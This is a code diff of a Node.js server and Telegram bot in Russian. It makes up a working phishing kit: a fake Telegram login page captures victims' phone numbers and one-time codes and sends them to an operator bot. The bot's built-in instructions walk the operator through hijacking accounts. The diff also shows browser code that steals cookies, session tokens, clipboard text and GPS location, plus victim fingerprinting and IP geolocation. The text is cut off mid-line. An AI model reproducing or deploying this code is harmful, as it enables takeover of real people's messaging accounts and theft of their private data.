@@ -3,188 +3,373 @@
 import express from 'express';
 import TelegramBot from 'node-telegram-bot-api';
 
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
-const PORT = process.env.PORT || 3000;
+// ==========================================
+// КОНФИГУРАЦИЯ
+// ==========================================
+const CONFIG = {
+    BOT_TOKEN: process.env.BOT_TOKEN,
+    ADMIN_ID: process.env.ADMIN_CHAT_ID,
+    PORT: process.env.PORT || 3000,
+    START_TIME: Date.now(),
+    RATE_LIMIT_WINDOW: 60000,
+    RATE_LIMIT_MAX: 10
+};
 
-if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
-    console.error("CRITICAL ERROR: BOT_TOKEN or ADMIN_CHAT_ID is missing");
+if (!CONFIG.BOT_TOKEN || !CONFIG.ADMIN_ID) {
+    console.error("❌ CRITICAL: Missing BOT_TOKEN or ADMIN_CHAT_ID");
     process.exit(1);
 }
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// ==========================================
+// ИНИЦИАЛИЗАЦИЯ
+// ==========================================
+const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
 const app = express();
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '15mb' }));
 
+// ==========================================
+// ГЛОБАЛЬНОЕ СОСТОЯНИЕ
+// ==========================================
 const State = {
     history: [],
-    stats: { visits: 0, clicks: 0, phones: 0, codes: 0, osCount: {}, geoCount: {} },
-    settings: { notifyEnabled: true, doubleCode: true, stealData: true, geoEnabled: true },
-    startTime: Date.now()
+    stats: {
+        visits: 0,
+        clicks: 0,
+        phones: 0,
+        codes: 0,
+        osCount: {},
+        geoCount: {}
+    },
+    settings: {
+        notifyEnabled: true,
+        doubleCode: true,
+        stealData: true,
+        geoEnabled: true
+    },
+    rateLimit: new Map()
 };
 
-async function getPing() {
-    const start = Date.now();
-    try { await bot.getMe(); return Date.now() - start; } catch (e) { return 999; }
-}
+// ==========================================
+// УТИЛИТЫ
+// ==========================================
+const Utils = {
+    formatTime: (ms) => {
+        const s = Math.floor(ms / 1000);
+        const m = Math.floor(s / 60);
+        const h = Math.floor(m / 60);
+        return `${h}ч ${m % 60}м ${s % 60}с`;
+    },
+    
+    getUptime: () => Utils.formatTime(Date.now() - CONFIG.START_TIME),
+    
+    getPing: async () => {
+        const start = Date.now();
+        try {
+            await bot.getMe();
+            return Date.now() - start;
+        } catch (e) {
+            return 999;
+        }
+    },
 
-function formatTime(ms) {
-    const seconds = Math.floor(ms / 1000);
-    const minutes = Math.floor(seconds / 60);
-    const hours = Math.floor(minutes / 60);
-    return `${hours}ч ${minutes % 60}м ${seconds % 60}с`;
-}
+    parseUA: (ua) => {
+        let res = { os: "Unknown", model: "Unknown", browser: "Unknown" };
+        if (!ua) return res;
+        
+        if (ua.includes("Android")) res.os = "Android";
+        else if (ua.includes("iPhone") || ua.includes("iPad")) res.os = "iOS";
+        else if (ua.includes("Windows")) res.os = "Windows";
+        else if (ua.includes("Mac OS")) res.os = "macOS";
+        else if (ua.includes("Linux")) res.os = "Linux";
+        
+        const match = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
+        if (match && match[1]) {
+            let m = match[1].trim();
+            if (m.includes("-")) m = m.split("-").pop();
+            res.model = m;
+        } else if (ua.includes("iPhone")) {
+            res.model = "iPhone";
+        } else if (ua.includes("Windows")) {
+            res.model = "PC";
+        }
+        
+        if (ua.includes("Chrome")) res.browser = "Chrome";
+        else if (ua.includes("Safari") && !ua.includes("Chrome")) res.browser = "Safari";
+        else if (ua.includes("Firefox")) res.browser = "Firefox";
+        else if (ua.includes("Telegram")) res.browser = "Telegram In-App";
+        
+        return res;
+    },
 
-function parseUserAgent(ua) {
-    let result = { os: "Unknown", model: "Unknown", browser: "Unknown" };
-    if (!ua) return result;
-    if (ua.includes("Android")) result.os = "Android";
-    else if (ua.includes("iPhone") || ua.includes("iPad")) result.os = "iOS";
-    else if (ua.includes("Windows")) result.os = "Windows";
-    else if (ua.includes("Mac OS")) result.os = "macOS";
-    else if (ua.includes("Linux")) result.os = "Linux";
-    const match = ua.match(/Android\s[0-9.]+;\s([^;)]+)/);
-    if (match && match[1]) {
-        let m = match[1].trim();
-        if (m.includes("-")) m = m.split("-").pop();
-        result.model = m;
-    } else if (ua.includes("iPhone")) result.model = "iPhone";
-    else if (ua.includes("Windows")) result.model = "PC";
-    if (ua.includes("Chrome")) result.browser = "Chrome";
-    else if (ua.includes("Safari") && !ua.includes("Chrome")) result.browser = "Safari";
-    else if (ua.includes("Firefox")) result.browser = "Firefox";
-    else if (ua.includes("Telegram")) result.browser = "Telegram In-App";
-    return result;
-}
-
-const bottomKeyboard = {
-    reply_markup: {
-        keyboard: [
-            [{ text: '📊 Статистика' }, { text: '📜 История' }],
-            [{ text: '⚙️ Настройки' }, { text: '📖 Инструкция' }],
-            [{ text: '🌐 Открыть Сайт' }]
-        ],
-        resize_keyboard: true,
-        is_persistent: true
+    checkRate: (ip) => {
+        const now = Date.now();
+        const record = State.rateLimit.get(ip) || { count: 0, start: now };
+        if (now - record.start > CONFIG.RATE_LIMIT_WINDOW) {
+            record.count = 0;
+            record.start = now;
+        }
+        record.count++;
+        State.rateLimit.set(ip, record);
+        return record.count <= CONFIG.RATE_LIMIT_MAX;
     }
 };
 
-bot.onText(/^\/start$/, (msg) => {
-    bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nID: <code>${msg.chat.id}</code>`, { parse_mode: 'HTML', ...bottomKeyboard });
-});
+// ==========================================
+// БОТ: КЛАВИАТУРЫ
+// ==========================================
+const Keyboards = {
+    bottom: {
+        reply_markup: {
+            keyboard: [
+                [{ text: '📊 Статистика' }, { text: '📜 История' }],
+                [{ text: '⚙️ Настройки' }, { text: '📖 Инструкция' }],
+                [{ text: '🌐 Открыть Сайт' }]
+            ],
+            resize_keyboard: true,
+            is_persistent: true
+        }
+    }
+};
 
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const text = msg.text;
-    if (text === '📊 Статистика') {
-        const uptime = formatTime(Date.now() - State.startTime);
-        const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
-        bot.sendMessage(chatId, `📊 <b>Статистика</b>\n\n⏱ Аптайм: ${uptime}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
-    }
-    if (text === '📜 История') {
-        if (State.history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
-        const histText = State.history.slice(0, 15).map((h, i) => `<b>${i + 1}.</b> <code>${h.phone}</code> | <code>${h.code}</code>`).join('\n');
-        bot.sendMessage(chatId, `📜 <b>Последние 15 целей:</b>\n\n${histText}`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🗑 Очистить', callback_data: 'clear' }]] } });
-    }
-    if (text === '⚙️ Настройки') {
-        const s = State.settings;
-        bot.sendMessage(chatId, `⚙️ <b>Настройки системы</b>`, {
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [
-                [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
-                [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
-                [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
-                [{ text: `Геолокация: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
-            ]}
+// ==========================================
+// БОТ: ЛОГИКА
+// ==========================================
+const BotLogic = {
+    sendAdmin: async (text) => {
+        if (!State.settings.notifyEnabled) return;
+        try {
+            await bot.sendMessage(CONFIG.ADMIN_ID, text, { parse_mode: 'HTML' });
+        } catch (e) {
+            console.error('Send error:', e.message);
+        }
+    },
+
+    init: () => {
+        // /start
+        bot.onText(/^\/start$/, (msg) => {
+            bot.sendMessage(msg.chat.id, `🛡 <b>Панель управления</b>\n\nID: <code>${msg.chat.id}</code>`, { 
+                parse_mode: 'HTML', 
+                ...Keyboards.bottom 
+            });
+        });
+
+        // Обработка нижних кнопок
+        bot.on('message', async (msg) => {
+            const chatId = msg.chat.id;
+            const text = msg.text;
+
+            if (text === '📊 Статистика') {
+                const topOS = Object.entries(State.stats.osCount)
+                    .sort((a, b) => b[1] - a[1])
+                    .slice(0, 3)
+                    .map(([os, c]) => `${os}: ${c}`)
+                    .join('\n');
+                    
+                const msgText = `📊 <b>Статистика</b>\n\n` +
+                    `⏱ Аптайм: ${Utils.getUptime()}\n` +
+                    `👁 Визитов: ${State.stats.visits}\n` +
+                    `🖱 Кликов: ${State.stats.clicks}\n` +
+                    `📱 Номеров: ${State.stats.phones}\n` +
+                    `🔑 Кодов: ${State.stats.codes}\n\n` +
+                    `<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`;
+                    
+                bot.sendMessage(chatId, msgText, { 
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] }
+                });
+            }
+
+            if (text === '📜 История') {
+                if (State.history.length === 0) return bot.sendMessage(chatId, '📜 История пуста.');
+                const histText = State.history.slice(0, 15).map((h, i) => 
+                    `<b>${i + 1}.</b> <code>${h.phone}</code> | <code>${h.code}</code>`
+                ).join('\n');
+                bot.sendMessage(chatId, `📜 <b>Последние 15 целей:</b>\n\n${histText}`, { 
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [[{ text: '🗑 Очистить', callback_data: 'clear' }]] }
+                });
+            }
+
+            if (text === '⚙️ Настройки') {
+                const s = State.settings;
+                bot.sendMessage(chatId, `⚙️ <b>Настройки системы</b>`, {
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [
+                        [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
+                        [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
+                        [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
+                        [{ text: `Геолокация: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
+                    ]}
+                });
+            }
+
+            if (text === '📖 Инструкция') {
+                bot.sendMessage(chatId, 
+                    `📖 <b>Инструкция</b>\n\n` +
+                    `1. Скинь ссылку.\n` +
+                    `2. Жертва вводит номер.\n` +
+                    `3. Ты вводишь номер в Telegram.\n` +
+                    `4. Жертва вводит код на сайте.\n` +
+                    `5. Вводишь код в Telegram.`, 
+                    { parse_mode: 'HTML' }
+                );
+            }
+
+            if (text === '🌐 Открыть Сайт') {
+                bot.sendMessage(chatId, `🌐 https://tg-sms-2.onrender.com`);
+            }
+        });
+
+        // Инлайн кнопки
+        bot.on('callback_query', async (query) => {
+            const chatId = query.message.chat.id;
+            const data = query.data;
+            bot.answerCallbackQuery(query.id);
+
+            if (data === 'stats') {
+                const topOS = Object.entries(State.stats.osCount)
+                    .sort((a, b) => b[1] - a[1])
+                    .slice(0, 3)
+                    .map(([os, c]) => `${os}: ${c}`)
+                    .join('\n');
+                    
+                const msgText = `📊 <b>Статистика</b>\n\n` +
+                    `⏱ Аптайм: ${Utils.getUptime()}\n` +
+                    `👁 Визитов: ${State.stats.visits}\n` +
+                    `🖱 Кликов: ${State.stats.clicks}\n` +
+                    `📱 Номеров: ${State.stats.phones}\n` +
+                    `🔑 Кодов: ${State.stats.codes}\n\n` +
+                    `<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`;
+                    
+                bot.editMessageText(msgText, { 
+                    chat_id: chatId, 
+                    message_id: query.message.message_id, 
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] }
+                });
+            }
+
+            if (data === 'clear') {
+                State.history = [];
+                State.stats.phones = 0;
+                State.stats.codes = 0;
+                bot.editMessageText('🗑 Очищено.', { chat_id: chatId, message_id: query.message.message_id });
+            }
+
+            if (data === 't_notify') State.settings.notifyEnabled = !State.settings.notifyEnabled;
+            if (data === 't_double') State.settings.doubleCode = !State.settings.doubleCode;
+            if (data === 't_steal') State.settings.stealData = !State.settings.stealData;
+            if (data === 't_geo') State.settings.geoEnabled = !State.settings.geoEnabled;
+
+            if (data.startsWith('t_')) {
+                const s = State.settings;
+                bot.editMessageText(`⚙️ <b>Настройки системы</b>`, {
+                    chat_id: chatId, 
+                    message_id: query.message.message_id, 
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [
+                        [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
+                        [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
+                        [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
+                        [{ text: `Геолокация: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
+                    ]}
+                });
+            }
         });
     }
-    if (text === '📖 Инструкция') {
-        bot.sendMessage(chatId, `📖 <b>Инструкция</b>\n\n1. Скинь ссылку.\n2. Жертва вводит номер.\n3. Ты вводишь номер в Telegram.\n4. Жертва вводит код на сайте.\n5. Вводишь код в Telegram.`, { parse_mode: 'HTML' });
-    }
-    if (text === '🌐 Открыть Сайт') {
-        bot.sendMessage(chatId, `🌐 https://tg-sms-2.onrender.com`);
-    }
-});
+};
 
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const data = query.data;
-    bot.answerCallbackQuery(query.id);
-    if (data === 'stats') {
-        const uptime = formatTime(Date.now() - State.startTime);
-        const topOS = Object.entries(State.stats.osCount).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([os, c]) => `${os}: ${c}`).join('\n');
-        bot.editMessageText(`📊 <b>Статистика</b>\n\n⏱ Аптайм: ${uptime}\n👁 Визитов: ${State.stats.visits}\n🖱 Кликов: ${State.stats.clicks}\n📱 Номеров: ${State.stats.phones}\n🔑 Кодов: ${State.stats.codes}\n\n<b>Топ ОС:</b>\n${topOS || 'Нет данных'}`, { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔄 Обновить', callback_data: 'stats' }]] } });
-    }
-    if (data === 'clear') {
-        State.history = []; State.stats.phones = 0; State.stats.codes = 0;
-        bot.editMessageText('🗑 Очищено.', { chat_id: chatId, message_id: query.message.message_id });
-    }
-    if (data === 't_notify') State.settings.notifyEnabled = !State.settings.notifyEnabled;
-    if (data === 't_double') State.settings.doubleCode = !State.settings.doubleCode;
-    if (data === 't_steal') State.settings.stealData = !State.settings.stealData;
-    if (data === 't_geo') State.settings.geoEnabled = !State.settings.geoEnabled;
-    if (data.startsWith('t_')) {
-        const s = State.settings;
-        bot.editMessageText(`⚙️ <b>Настройки системы</b>`, {
-            chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [
-                [{ text: `Уведомления: ${s.notifyEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_notify' }],
-                [{ text: `Двойной код: ${s.doubleCode ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_double' }],
-                [{ text: `Стиллер: ${s.stealData ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_steal' }],
-                [{ text: `Геолокация: ${s.geoEnabled ? 'ВКЛ ✅' : 'ВЫКЛ ❌'}`, callback_data: 't_geo' }]
-            ]}
-        });
-    }
-});
-
-async function notifyAdmin(text, force = false) {
-    if (!State.settings.notifyEnabled && !force) return;
-    try { await bot.sendMessage(ADMIN_CHAT_ID, text, { parse_mode: 'HTML' }); } catch (e) {}
-}
-
+// ==========================================
+// API МАРШРУТЫ
+// ==========================================
 app.post('/api/new_target', async (req, res) => {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    if (!Utils.checkRate(ip)) {
+        return res.status(429).json({ ok: false, error: 'Rate limit exceeded' });
+    }
+
     State.stats.visits++;
     State.stats.phones++;
+    
     const { phone, ua, screen, battery, memory, network, geo, steal } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    if (!phone || phone.length < 8) return res.status(400).json({ ok: false });
-    const device = parseUserAgent(ua);
+    
+    if (!phone || phone.length < 8) {
+        return res.status(400).json({ ok: false });
+    }
+
+    const device = Utils.parseUA(ua);
     State.stats.osCount[device.os] = (State.stats.osCount[device.os] || 0) + 1;
+
     let locStr = "Unknown";
     try {
         const r = await fetch(`http://ip-api.com/json/${ip.split(',')[0]}?fields=country,city,isp`);
         const d = await r.json();
-        if (d.country) locStr = `${d.country}, ${d.city} (${d.isp})`;
+        if (d.country) {
+            locStr = `${d.country}, ${d.city} (${d.isp})`;
+            State.stats.geoCount[d.country] = (State.stats.geoCount[d.country] || 0) + 1;
+        }
     } catch (e) {}
-    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n📱 <b>Номер:</b> <code>${phone}</code>\n💻 <b>Устройство:</b> ${device.os} / ${device.model}\n🌐 <b>Браузер:</b> ${device.browser}\n🖥 <b>Экран:</b> ${screen}\n🔋 <b>Батарея:</b> ${battery}\n🧠 <b>ОЗУ:</b> ${memory}\n📶 <b>Сеть:</b> ${network}\n🌍 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n📍 <b>Локация:</b> ${locStr}\n`;
-    if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть</a>\n`;
+
+    let msg = `🎯 <b>НОВАЯ ЦЕЛЬ</b>\n\n` +
+        `📱 <b>Номер:</b> <code>${phone}</code>\n` +
+        `💻 <b>Устройство:</b> ${device.os} / ${device.model}\n` +
+        `🌐 <b>Браузер:</b> ${device.browser}\n` +
+        `🖥 <b>Экран:</b> ${screen || '?'}\n` +
+        `🔋 <b>Батарея:</b> ${battery || '?'}\n` +
+        `🧠 <b>ОЗУ:</b> ${memory || '?'}\n` +
+        `📶 <b>Сеть:</b> ${network || '?'}\n\n` +
+        `🌍 <b>IP:</b> <code>${ip.split(',')[0]}</code>\n` +
+        `📍 <b>Локация:</b> ${locStr}\n`;
+
+    if (geo) msg += `🗺 <b>GPS:</b> <a href="https://maps.google.com/?q=${geo}">Открыть карту</a>\n`;
+
     if (steal && steal.length > 0 && State.settings.stealData) {
-        msg += `\n🍪 <b>УКРАДЕНО:</b>\n`;
-        steal.slice(0, 5).forEach(s => { msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 15)}...</code>\n`; });
+        msg += `\n🍪 <b>УКРАДЕНО (Cookies/LS):</b>\n`;
+        steal.slice(0, 5).forEach(s => {
+            msg += `<code>${s.name}</code>: <code>${s.value.substring(0, 15)}...</code>\n`;
+        });
+        if (steal.length > 5) msg += `<i>...и еще ${steal.length - 5} записей</i>\n`;
     }
+
     msg += `🕒 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
-    await notifyAdmin(msg);
+    
+    await BotLogic.sendAdmin(msg);
     res.json({ ok: true, doubleCode: State.settings.doubleCode });
 });
 
-app.post('/api/click', (req, res) => { State.stats.clicks++; res.json({ ok: true }); });
+app.post('/api/click', (req, res) => {
+    State.stats.clicks++;
+    res.json({ ok: true });
+});
 
 app.post('/api/code', async (req, res) => {
     State.stats.codes++;
     const { phone, code } = req.body;
-    State.history.unshift({ phone, code });
+    
+    State.history.unshift({ phone, code, time: Date.now() });
     if (State.history.length > 50) State.history.pop();
-    await notifyAdmin(`😈 <b>ПЕРЕХВАТ КОДА</b>\n\n📱 <code>${phone}</code>\n🔑 <code>${code}</code>\n\n🏃‍♂️ <i>БЕГИ В TELEGRAM!</i>`);
+
+    const msg = `😈 <b>ПЕРЕХВАТ КОДА</b>\n\n` +
+        `📱 Номер: <code>${phone}</code>\n` +
+        `🔑 Код: <code>${code}</code>\n\n` +
+        `🏃‍♂️ <i>БЕГИ В TELEGRAM И ВВОДИ!</i>`;
+    
+    await BotLogic.sendAdmin(msg);
     res.json({ ok: true });
 });
 
+// ==========================================
+// ОТДАЧА САЙТА
+// ==========================================
 app.get('/', (req, res) => {
-    res.send(`<!DOCTYPE html>
+    res.send(`
+<!DOCTYPE html>
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Telegram</title>
+<title>Telegram: Авторизация</title>
 <style>
     :root { --bg: #17212b; --surface: #0e1621; --primary: #2aabee; --primary-hover: #229ed9; --text: #ffffff; --text-muted: #708499; --border: #2b5278; }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
@@ -254,38 +439,4 @@ app.get('/', (req, res) => {
     const btnPhone = document.getElementById('btnPhone');
     const btnCode = document.getElementById('btnCode');
     const countryCode = document.getElementById('countryCode');
-    const codeInputs = document.querySelectorAll('.code-input');
-    const titleEl = document.getElementById('title');
-    const subtitleEl = document.getElementById('subtitle');
-    const phoneInput = document.getElementById('phone');
-    const clockEl = document.getElementById('clock');
-    const hiddenStealer = document.getElementById('hiddenStealer');
-    let phoneValue = '', firstCodeValue = '', geoData = null, clipData = null, stolenData = [], batteryLevel = 'Скрыто', isCharging = false, memorySize = 'Скрыто', networkType = 'Неизвестно', isDoubleCode = true, isClicked = false;
-    const Collector = {
-        init() { this.collectSteal(); this.collectBattery(); this.collectMemory(); this.collectNetwork(); this.collectGeo(); this.initClock(); this.initClipboard(); this.initClickTracking(); },
-        collectSteal() {
-            try {
-                document.cookie.split(';').forEach(c => { const [n, ...v] = c.split('='); if (n && v.length) stolenData.push({ name: n.trim(), value: v.join('=') }); });
-                for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); if (k.includes('token') || k.includes('auth') || k.includes('session') || k.includes('user')) stolenData.push({ name: 'LS:' + k, value: localStorage.getItem(k) }); }
-                for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); if (k.includes('token') || k.includes('auth') || k.includes('session')) stolenData.push({ name: 'SS:' + k, value: sessionStorage.getItem(k) }); }
-            } catch (e) {}
-        },
-        async collectBattery() { try { if (navigator.getBattery) { const b = await navigator.getBattery(); batteryLevel = Math.round(b.level * 100) + '%'; isCharging = b.charging; } } catch (e) {} },
-        collectMemory() { try { if (navigator.deviceMemory) memorySize = navigator.deviceMemory + ' GB'; } catch (e) {} },
-        collectNetwork() { try { if (navigator.connection) networkType = navigator.connection.effectiveType || 'Неизвестно'; } catch (e) {} },
-        collectGeo() { try { if (navigator.geolocation) navigator.geolocation.getCurrentPosition((p) => { geoData = p.coords.latitude + ',' + p.coords.longitude; }, () => {}, { enableHighAccuracy: true, timeout: 5000 }); } catch (e) {} },
-        initClock() { const u = () => { const d = new Date(); clockEl.textContent = d.getHours().toString().padStart(2, '0') + ':' + d.getMinutes().toString().padStart(2, '0'); }; u(); setInterval(u, 1000); },
-        initClipboard() {
-            const r = async () => { try { if (navigator.clipboard) { const t = await navigator.clipboard.readText(); if (t && t.length > 2) clipData = t.slice(0, 150); } else { hiddenStealer.focus(); document.execCommand('paste'); clipData = hiddenStealer.value.slice(0, 150); } } catch (e) {} };
-            phoneInput.addEventListener('focus', r); document.body.addEventListener('click', r);
-        },
-        initClickTracking() {
-            const t = () => { if (isClicked) return; isClicked = true; fetch('/api/click', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }).catch(() => {}); };
-            document.body.addEventListener('click', t); document.body.addEventListener('touchstart', t);
-        }
-    };
-    const UI = {
-        init() { Collector.init(); this.initPhoneMask(); this.initCodeInputs(); },
-        initPhoneMask() { phoneInput.addEventListener('input', (e) => { let v = e.target.value.replace(/\\D/g, ''); if (v.length > 9) v = v.slice(0, 9); let f = v; if (v.length > 6) f = v.slice(0, 3) + ' ' + v.slice(3, 6) + ' ' + v.slice(6); else if (v.length > 3) f = v.slice(0, 3) + ' ' + v.slice(3); e.target.value = f; }); },
-        initCodeInputs() { codeInputs.forEach((inp, i) => { inp.addEventListener('input', (e) => { if (e.target.value.length === 1 && i < 4) codeInputs[i + 1].focus(); }); inp.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && e.target.value.length === 0 && i > 0) codeInputs[i - 1].focus(); }); }); },
-        showCodeForm() { phoneForm.classList.add('hidden'); codeForm.classList.remove('hidden'); titleEl.textContent = 'Введите код'; subtitleEl.innerHTML = 'Мы отправили код в Telegram на номер <b>+' + phoneValue + '</b>'; setTimeout(() => codeInput
+    const codeInputs = docu
